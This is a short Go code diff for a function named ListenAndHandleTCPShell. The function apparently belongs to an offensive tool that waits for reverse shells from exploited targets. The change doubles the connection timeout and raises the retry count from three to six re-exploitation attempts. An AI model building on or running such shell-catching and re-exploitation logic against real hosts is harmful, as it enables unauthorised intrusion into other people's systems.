@@ -32,7 +32,7 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
     select{
     case conn = <- connchan:
       i = -1
-    case <- time.After(3000 * time.Millisecond):
+    case <- time.After(6000 * time.Millisecond):
       fmt.Println("No connection found, attempting to exploit again")
       exploit_request_channel <- ip
     }
@@ -40,8 +40,8 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
       break
     }
     i++
-    if i == 3 {
-      fmt.Println("Failed to exploit target after 3 tries: " + ip)
+    if i == 6 {
+      fmt.Println("Failed to exploit target after 6 tries: " + ip)
       return
     }
   }
